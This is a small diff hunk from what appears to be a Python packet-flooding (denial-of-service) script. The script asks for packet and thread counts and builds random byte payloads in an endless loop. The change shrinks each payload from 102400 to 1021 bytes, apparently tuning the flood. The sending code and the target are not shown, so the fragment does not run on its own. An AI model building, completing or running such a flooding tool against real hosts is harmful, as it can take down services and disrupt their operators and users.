@@ -92,7 +92,7 @@ times = int(input("PACKETS : "))
 threads = int(input("THREADS : "))
 os.system("clear")
 def run():
-	data = random._urandom(102400)
+	data = random._urandom(1021)
 	i = random.choice(("[!]","[!]","[!]"))
 	while True:
 		try:
